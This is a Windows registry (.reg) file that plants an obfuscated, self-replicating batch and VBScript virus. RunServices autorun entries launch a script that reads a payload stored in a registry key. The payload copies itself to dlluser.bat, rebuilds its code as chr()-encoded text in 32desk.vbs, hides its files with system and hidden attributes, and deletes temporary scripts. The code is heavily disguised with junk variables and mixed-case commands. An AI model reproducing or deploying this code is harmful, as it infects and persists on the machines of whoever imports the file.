REGEDIT4
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]
"a8dkrF"="command /c echo set IJvVS5MI=createobject(\"Scripting.filesystemobject\").createtextfile(\"CdA.bat\"):IJvVS5MI.write createobject(\"wscript.shell\").regread(\"HKCU\\Software\\wVx68qM3\\\"):createobject(\"wscript.shell\").run \"IJvVS5MI.bat\",0>gn.vbs"
"a8dkrFTTo"="command /c cscript gn.vbs>nul"
[HKEY_CURRENT_USER\Software\wVx68qM3]
@="%f~\\ІГ$╔%\r\n@ECHo oFf%nХR_%\r\nVEr|FiND /I \"Xp\"|iF erRoRleVEL 1 cTTY nUL%nХR_%\r\nRem ??y+O|SET cд┴§х=Script%nХR_%\r\nEChO.on error resume next>%tmp%\\6jL0.Kij%nХR_%\r\nEcHo sET OT61D9y4v=cReAteObjEcT(\"w%cд┴§х%.shell\")>>%tmp%\\6jL0.Kij%nХR_%\r\necho OT61D9y4v.run \"%wInDir%\\dlluser.bat zU\",0>>%tmP%\\6jL0.Kij%nХR_%\r\nif yXGne(F%wiNDIR%==yXGne(F SET windir=%systemroot%%nХR_%\r\nif exist %wInDir%\\dlluser.bat attrib -r -s -h %wInDir%\\dlluser.bat%nХR_%\r\nEChO %%f~\\ІГ$╔%%>%wInDir%\\dlluser.bat\r\nfind \"nХR_\"<%0>>%wInDir%\\dlluser.bat\r\nfind /i /v \"run\"<%TMP%\\6jL0.Kij>%wInDir%\\32desk.vbs%nХR_%\r\nECHO SEt k8twESK=cREaTEOBJeCT(\"%cд┴§х%ing.filesystemobject\")>>%wInDir%\\32desk.vbs%nХR_%\r\nEcHO if not(err.number=0) then>>%wInDir%\\32desk.vbs%nХR_%\r\nREm ??y+O|echO javascript:location.reload()>>%wInDir%\\32desk.vbs%nХR_%\r\nEcHo else>>%wInDir%\\32desk.vbs%nХR_%\r\nEcHo SET OxJhWLD=k8twESK.createtextfile(\"%tMP%\\xScU.bat\",1)>>%wInDir%\\32desk.vbs%nХR_%\r\nECHO.on error resume next>%tMp%\\93CN0Sio.vbs%nХR_%\r\nEChO Set ClTW=cReATEoBjecT(\"%cд┴§х%ing.filesystemobject\")>>%TMP%\\93CN0Sio.vbs%nХR_%\r\necho set kAlCyDCJOL=crEateOBjeCT(\"w%cд┴§х%.shell\")>>%tMP%\\93CN0Sio.vbs%nХR_%\r\nEcho seT ye=ClTW.opentextfile(\"%wInDir%\\dlluser.bat\")>>%Tmp%\\93CN0Sio.vbs%nХR_%\r\nEcHo RERqbxCI=ye.readall>>%tmP%\\93CN0Sio.vbs%nХR_%\r\necHO sET ye=ClTW.opentextfile(\"%wInDir%\\32desk.vbs\",8)>>%TMP%\\93CN0Sio.vbs%nХR_%\r\neCHo ye.write \"OxJhWLD.write \"\"\"\"\">>%TmP%\\93CN0Sio.vbs%nХR_%\r\nECHo for A2QsKemc=1 to len(RERqbxCI)>>%tmp%\\93CN0Sio.vbs%nХR_%\r\nECho zY=asc(mid(RERqbxCI,A2QsKemc,1))>>%TmP%\\93CN0Sio.vbs%nХR_%\r\nechO ye.write \"&chr(\"&zY&\")\">>%TmP%\\93CN0Sio.vbs%nХR_%\r\nEchO next>>%tMp%\\93CN0Sio.vbs%nХR_%\r\nEchO ye.write vbcrlf>>%TMP%\\93CN0Sio.vbs%nХR_%\r\necHO ye.writeline \"OT61D9y4v.run \"&chr(34)&\"%tmp%\\xScU.bat\"&chr(34)&\",0\">>%Tmp%\\93CN0Sio.vbs%nХR_%\r\nEcho ye.write \"end if\">>%tMP%\\93CN0Sio.vbs%nХR_%\r\ncscript %tMp%\\93CN0Sio.vbs>nul%nХR_%\r\n%nХR_%sET `e─=del\r\n%nХR_%SET рь=%`e─% %Tmp%\\*.\r\nattrib +r +s +h %wInDir%\\dlluser.bat%nХR_%\r\n%рь%Kij%nХR_%\r\n%рь%bat%nХR_%\r\n%рь%vbs%nХR_%\r\n%рь%js%nХR_%\r\nVER|find /I \"xp\"|If ErROrLeveL 1 CttY cON%nХR_%\r\n:nХR_0j\r\ncls%nХR_%\r\n"
